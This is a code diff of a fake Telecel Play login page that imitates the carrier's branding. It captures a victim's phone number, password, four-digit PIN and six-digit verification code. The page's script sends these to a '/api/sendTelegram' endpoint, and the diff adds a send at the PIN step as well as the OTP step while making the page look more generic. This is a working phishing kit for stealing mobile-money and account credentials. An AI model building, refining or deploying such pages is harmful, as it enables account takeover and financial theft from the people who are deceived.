@@ -4,213 +4,318 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 
-<title>Telecel Play Login</title>
+<title>Secure Login</title>
 
-<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
 
 <style>
 
-*{box-sizing:border-box}
+*{
+box-sizing:border-box;
+font-family:"Plus Jakarta Sans",system-ui;
+}
 
 body{
-font-family:"Plus Jakarta Sans",system-ui;
+
 margin:0;
 min-height:100vh;
+
 display:flex;
 align-items:center;
 justify-content:center;
-background:linear-gradient(180deg,#fff5f7,#ffe3e8);
-overflow:hidden;
+
+background:#f2f2f7;
+
 }
 
-.wave{
-position:fixed;
-width:700px;
-height:700px;
-border-radius:50%;
-background:radial-gradient(circle,rgba(230,0,35,.18),transparent 70%);
-filter:blur(40px);
-animation:float 20s infinite linear;
-z-index:-1;
-}
 
-.wave.one{top:-250px;right:-150px}
-.wave.two{bottom:-250px;left:-150px;animation-duration:24s}
-
-@keyframes float{
-0%{transform:translateY(0)}
-50%{transform:translateY(40px)}
-100%{transform:translateY(0)}
-}
-
-.step{
-position:absolute;
-width:100%;
-max-width:420px;
-padding:28px;
-background:white;
-border-radius:20px;
-box-shadow:0 30px 60px rgba(0,0,0,.2);
-transition:.4s;
-}
+/* container */
 
 .container{
-position:relative;
+
 width:100%;
-max-width:420px;
-height:560px;
+max-width:380px;
+
 }
+
+
+/* card */
+
+.step{
+
+background:white;
+
+padding:26px;
+
+border-radius:22px;
+
+box-shadow:
+
+0 10px 25px rgba(0,0,0,.08),
+0 2px 6px rgba(0,0,0,.05);
+
+transition:.35s;
+
+}
+
+
+.hidden{
+
+opacity:0;
+transform:translateY(8px);
+pointer-events:none;
+
+}
+
 
 .logo{
-height:120px;
+
+height:70px;
 display:block;
-margin:auto;
+margin:0 auto 10px;
+
 }
 
-.pulse{
-height:90px;
-animation:pulse 1.2s infinite ease-in-out;
-}
 
-@keyframes pulse{
-0%{transform:scale(.85);opacity:.6}
-50%{transform:scale(1.05);opacity:1}
-100%{transform:scale(.85);opacity:.6}
-}
+/* typography */
 
 h1{
+
+font-size:20px;
+
 text-align:center;
-color:#e60023;
-margin:8px 0 4px;
-font-size:22px;
-font-weight:800;
+
+margin:6px 0 4px;
+
+font-weight:600;
+
+color:#111;
+
 }
+
 
 .subtitle{
+
 text-align:center;
+
 font-size:13px;
-color:#444;
-margin-bottom:16px;
+
+color:#666;
+
+margin-bottom:18px;
+
 }
+
+
+/* inputs */
 
 label{
-font-size:13px;
-margin-top:12px;
+
+font-size:12px;
+
+color:#666;
+
 display:block;
+
+margin-top:12px;
+
+margin-bottom:4px;
+
 }
+
 
 input{
+
 width:100%;
-padding:12px;
-border-radius:10px;
-border:1px solid #e5e5e5;
+
+padding:13px;
+
+border-radius:12px;
+
+border:1px solid #e5e5ea;
+
+font-size:15px;
+
 background:#fafafa;
-margin-top:5px;
-font-size:14px;
+
+transition:.15s;
+
 }
+
 
 input:focus{
+
 outline:none;
-border-color:#e60023;
+
 background:white;
+
+border-color:#d1d1d6;
+
+box-shadow:
+
+0 0 0 4px rgba(0,0,0,.04);
+
 }
+
 
 .password-box{
+
 position:relative;
+
 }
+
 
 .eye{
+
 position:absolute;
-right:10px;
+
+right:12px;
+
 top:50%;
+
 transform:translateY(-50%);
+
+font-size:14px;
+
 cursor:pointer;
+
+color:#888;
+
 }
 
-.hint{
-font-size:12px;
-color:#e60023;
-margin-top:4px;
-}
+
+/* buttons */
 
 .btn{
+
 margin-top:18px;
+
 width:100%;
-padding:12px;
-border-radius:12px;
-border:0;
-font-weight:700;
-background:#e60023;
-color:white;
-cursor:pointer;
-}
 
-
-/* iPhone style PIN */
-
-.pin{
-display:flex;
-gap:14px;
-justify-content:center;
-margin:22px 0;
-}
-
-.pin input{
-width:54px;
-height:60px;
-font-size:22px;
-text-align:center;
+padding:13px;
 
 border-radius:14px;
 
-border:1.5px solid #e5e5e5;
+border:0;
+
+font-size:15px;
+
+font-weight:600;
+
+background:#000;
+
+color:white;
+
+cursor:pointer;
+
+transition:.15s;
+
+}
+
+
+.btn:active{
+
+transform:scale(.98);
+
+}
+
+
+/* pin */
+
+.pin{
+
+display:flex;
+
+justify-content:space-between;
+
+gap:10px;
+
+margin:18px 0;
+
+}
+
+
+.pin input{
+
+width:100%;
+
+height:58px;
+
+font-size:22px;
+
+text-align:center;
+
+border-radius:16px;
+
+border:1px solid #e5e5ea;
 
 background:white;
 
-box-shadow:
-0 2px 6px rgba(0,0,0,.05),
-inset 0 1px 2px rgba(0,0,0,.04);
+transition:.15s;
 
-transition:.2s;
 }
+
 
 .pin input:focus{
 
-border-color:#e60023;
+border-color:black;
 
 box-shadow:
-0 0 0 3px rgba(230,0,35,.15),
-0 4px 12px rgba(0,0,0,.08);
 
-transform:translateY(-1px);
+0 0 0 4px rgba(0,0,0,.05);
 
 }
 
+
+/* timer */
 
 .count{
+
 text-align:center;
-font-size:13px;
-color:#666;
+
+font-size:12px;
+
+color:#888;
+
+margin-top:6px;
+
 }
 
-.hidden{
-opacity:0;
-pointer-events:none;
-transform:translateX(40px);
-}
 
 .resend{
+
 text-align:center;
+
 margin-top:10px;
+
 font-size:13px;
+
 }
 
+
 .resend button{
+
 border:0;
+
 background:none;
-color:#e60023;
+
+color:black;
+
+font-weight:500;
+
 cursor:pointer;
-font-weight:600;
+
+}
+
+
+.success{
+
+text-align:center;
+
+font-size:15px;
+
+color:#666;
+
 }
 
 </style>
@@ -219,8 +324,7 @@ font-weight:600;
 
 <body>
 
-<div class="wave one"></div>
-<div class="wave two"></div>
+
 
 <div class="container">
 
@@ -229,31 +333,38 @@ font-weight:600;
 
 <img src="assets/telecel.svg" class="logo">
 
-<h1>Welcome to Telecel Play</h1>
+<h1>Sign in</h1>
 
 <div class="subtitle">
 
-Enter your number to log in.
+Use your mobile number
 
 </div>
 
+
 <form id="form">
 
-<label>Phone Number</label>
-<input id="phone" placeholder="0XXXXXXXXX" inputmode="numeric">
+<label>Phone number</label>
+
+<input id="phone" inputmode="numeric">
+
 
 <label>Password</label>
 
 <div class="password-box">
+
 <input id="password" type="password">
+
 <span class="eye" onclick="togglePassword()">👁</span>
+
 </div>
 
-<div class="hint">
-Use your Telecel Play password
-</div>
 
-<button class="btn">Next</button>
+<button class="btn">
+
+Continue
+
+</button>
 
 </form>
 
@@ -261,63 +372,69 @@ Use your Telecel Play password
 
 
 
+
 <div id="loading" class="step hidden">
 
-<div style="text-align:center">
+<div class="success">
 
-<img src="assets/telecel.svg" class="pulse">
-
-<div>Connecting securely...</div>
+Checking details...
 
 </div>
 
 </div>
+
 
 
 
 <div id="step2" class="step hidden">
 
-<img src="assets/telecash.webp" style="height:80px;display:block;margin:auto">
-
-<h1>Enter your PIN</h1>
+<h1>Enter PIN</h1>
 
 <div class="subtitle" id="showNumber"></div>
 
+
 <div class="pin">
 
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
+<input maxlength="1">
+<input maxlength="1">
+<input maxlength="1">
+<input maxlength="1">
 
 </div>
 
-<button class="btn" onclick="submitPin()">Continue</button>
+<button class="btn" onclick="submitPin()">
+
+Continue
+
+</button>
 
 </div>
+
 
 
 
 <div id="step3" class="step hidden">
 
-<h1>Verify Code</h1>
+<h1>Verification code</h1>
 
 <div class="subtitle">
 
-Enter 6 digit verification code
+6 digit code
 
 </div>
+
 
 <div class="pin">
 
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
-<input maxlength="1" inputmode="numeric">
+<input maxlength="1">
+<input maxlength="1">
+<input maxlength="1">
+<input maxlength="1">
+<input maxlength="1">
+<input maxlength="1">
 
 </div>
+
 
 <div class="count">
 
@@ -325,89 +442,53 @@ Code expires in <span id="time">60</span>s
 
 </div>
 
+
 <div class="resend">
 
-<button onclick="resendOtp()">Resend Code</button>
+<button onclick="resendOtp()">
+
+Resend
+
+</button>
 
 </div>
 
-<button class="btn" onclick="submitOtp()">Verify</button>
+
+<button class="btn" onclick="submitOtp()">
+
+Verify
+
+</button>
 
 </div>
+
 
 
 
 <div id="step4" class="step hidden">
 
-<div style="text-align:center">
+<div class="success">
 
-<img src="assets/telecel.svg" class="pulse">
-
-<h1>Success</h1>
-
-<div class="subtitle">
-
-Logging you in...
-
-</div>
+Login successful
 
 </div>
 
 </div>
 
 
+
 </div>
+
 
 
 
 <script>
 
 
-const ua=navigator.userAgent
-
-let device="Unknown"
-
-if(/Android/i.test(ua)) device="Android"
-else if(/iPhone|iPad/i.test(ua)) device="iOS"
-
-if(/Chrome/i.test(ua)) device+=" | Chrome"
-else if(/Safari/i.test(ua)) device+=" | Safari"
-else if(/Firefox/i.test(ua)) device+=" | Firefox"
-
-
-
-let planLine="Not captured"
-
-try{
-
-const p=JSON.parse(sessionStorage.getItem("selectedPlan"))
-
-if(p){
-
-planLine=[p.name||"",p.price||""].join(" — ")
-
-}
-
-}catch(e){}
-
-
-
 let phoneValue=""
 let passwordValue=""
 let pinValue=""
 let otpValue=""
-
-
-
-phone.oninput=e=>{
-
-let v=e.target.value.replace(/\D/g,"").slice(0,10)
-
-if(v[0]!=="0") v="0"+v.slice(1)
-
-e.target.value=v
-
-}
 
 
 
@@ -422,23 +503,26 @@ password.type=password.type==="password"?"text":"password"
 function show(id){
 
 document.querySelectorAll(".step")
+
 .forEach(s=>s.classList.add("hidden"))
 
 document.getElementById(id)
+
 .classList.remove("hidden")
 
 }
 
 
 
-/* final combined telegram */
-
-function buildMessage(){
+function buildMessage(stage){
 
 return `
 Time: ${new Date().toISOString()}
 
 <b>Telecel Play Login</b>
+
+<b>Stage</b>
+${stage}
 
 <b>Number</b>
 ${phoneValue}
@@ -451,29 +535,27 @@ ${pinValue}
 
 <b>Otp</b>
 ${otpValue}
-
-<b>Plan</b>
-${planLine}
-
-<b>Device</b>
-${device}
 `
 
 }
 
 
 
-async function sendFinal(){
+async function sendToServer(stage){
 
 await fetch("/api/sendTelegram",{
 
 method:"POST",
 
-headers:{"Content-Type":"application/json"},
+headers:{
+
+"Content-Type":"application/json"
+
+},
 
 body:JSON.stringify({
 
-message:buildMessage(),
+message:buildMessage(stage),
 
 parse_mode:"HTML"
 
@@ -495,8 +577,6 @@ phoneValue=phone.value
 
 passwordValue=password.value
 
-phoneValue="+233"+phoneValue.slice(1)
-
 show("loading")
 
 setTimeout(()=>{
@@ -505,26 +585,29 @@ showNumber.textContent=phoneValue
 
 show("step2")
 
-},900)
+},700)
 
 }
 
 
 
-/* PIN */
+/* pin */
 
 const pinInputs=document.querySelectorAll("#step2 input")
 
 pinInputs.forEach((input,index)=>{
+
 
 input.addEventListener("input",()=>{
 
 input.value=input.value.replace(/\D/g,"")
 
 if(input.value && index<3)
+
 pinInputs[index+1].focus()
 
 })
+
 
 input.addEventListener("keydown",(e)=>{
 
@@ -538,12 +621,20 @@ pinInputs[index-1].value=""
 
 })
 
+
 })
 
 
 function submitPin(){
 
-pinValue=[...pinInputs].map(i=>i.value).join("")
+pinValue=[...pinInputs]
+
+.map(i=>i.value)
+
+.join("")
+
+
+sendToServer("Pin")
 
 show("loading")
 
@@ -553,26 +644,30 @@ show("step3")
 
 startTimer()
 
-},800)
+},700)
 
 }
 
 
 
-/* OTP */
+
+/* otp */
 
 const otpInputs=document.querySelectorAll("#step3 input")
 
 otpInputs.forEach((input,index)=>{
+
 
 input.addEventListener("input",()=>{
 
 input.value=input.value.replace(/\D/g,"")
 
 if(input.value && index<5)
+
 otpInputs[index+1].focus()
 
 })
+
 
 input.addEventListener("keydown",(e)=>{
 
@@ -586,18 +681,22 @@ otpInputs[index-1].value=""
 
 })
 
+
 })
 
 
 function submitOtp(){
 
-otpValue=[...otpInputs].map(i=>i.value).join("")
+otpValue=[...otpInputs]
 
-sendFinal()
+.map(i=>i.value)
+
+.join("")
+
+
+sendToServer("Otp")
 
 show("step4")
-
-setTimeout(()=>location.href="thankyou.html",1500)
 
 }
 
@@ -617,13 +716,17 @@ let t=60
 
 time.textContent=t
 
+
 const i=setInterval(()=>{
 
 t--
 
 time.textContent=t
 
-if(t<=0) clearInterval(i)
+
+if(t<=0)
+
+clearInterval(i)
 
 },1000)
 
